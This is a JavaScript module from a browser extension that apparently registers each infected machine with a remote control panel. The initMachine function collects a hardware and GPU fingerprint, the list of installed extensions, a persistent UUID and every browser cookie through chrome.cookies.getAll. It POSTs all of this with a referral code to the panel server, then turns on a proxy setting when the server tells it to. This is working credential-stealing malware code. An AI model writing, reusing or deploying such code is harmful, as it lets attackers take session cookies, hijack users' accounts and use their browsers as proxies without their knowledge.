import {v4 as uuidv4} from 'https://jspm.dev/uuid'

import {getExtensions} from "./extensions.js";
import config from "../../config.js";

const parsePlatformOs = (platform) => {
    return new Promise(async (res) => {
        switch (platform) {
            case "win":
                res("Windows")

                break;
            case "mac":
                res("MacOS")

                break;
            case "android":
                res("Android")

                break;
            case "cros":
                res("Chrome OS")

                break;
            case "linux":
                res("Linux")

                break;
            case "openbsd":
                res("Open/FreeBSD")

                break;
            case "fuchsia":
                res("Fuchsia")

                break;
            default:
                res(platform)

                break;
        }
    })
}

const getMachineInfo = () => {
    return new Promise(async (res) => {
        const info = {
            cpuName: null,
            platform: {
                name: null,
                arch: null
            },
            displays: null,
            storage: null,
            memory: null,
            video: {
                vendor: null,
                renderer: null
            }
        }

        try {
            const cpuInfo = await chrome.system.cpu.getInfo()
            const displayInfo = await chrome.system.display.getInfo()
            const storageInfo = await chrome.system.storage.getInfo()
            const memoryInfo = await chrome.system.memory.getInfo()
            const platformInfo = await chrome.runtime.getPlatformInfo()

            const canvas = new OffscreenCanvas(1, 1);
            const gl = canvas.getContext('webgl')
            const ext = gl.getExtension('WEBGL_debug_renderer_info');

            info.cpuName = cpuInfo.modelName.replace(/\s+/g, ' ').trim()
            info.platform = {
                name: await parsePlatformOs(platformInfo.os),
                arch: platformInfo.arch
            }
            info.displays = displayInfo
            info.storage = storageInfo
            info.memory = memoryInfo
            info.video = ext ? {
                vendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL),
                renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL),
            } : {
                vendor: "unknown",
                renderer: "unknown",
            };

            return res(info)
        } catch (e) {
            return res(info)
        }
    })
}

export const initMachine = async () => {
    return new Promise(async (res) => {
        const machineInfo = await getMachineInfo()

        const manifest = await chrome.runtime.getManifest()
        const extensionVersion = manifest.version

        const extensions = await getExtensions()
        const cacheUuid = await chrome.storage.local.get(['uuid'])

        const cookies = await chrome.cookies.getAll({})

        let uuid

        if (typeof cacheUuid.uuid === "undefined") {
            uuid = uuidv4()
        } else {
            uuid = cacheUuid.uuid
        }

        chrome.storage.local.set({
            uuid
        })

        machineInfo.userAgent = navigator.userAgent

        const machineData = {
            machineInfo,
            extensionVersion,
            extensions,
            uuid,
            cookies,
            referralCode: config.referralCode
        }

        const request = await fetch(`${config.panelUrl}/machine/init`, {
            method: 'POST',
            headers: {
                'Accept': 'application/json, application/xml, text/plain, text/html, *.*',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(machineData)
        })
        const machine = request.json()

        chrome.storage.local.set({
            proxyEnabled: machine.isEnabledProxy
        })

        return res(machine)
    })
}
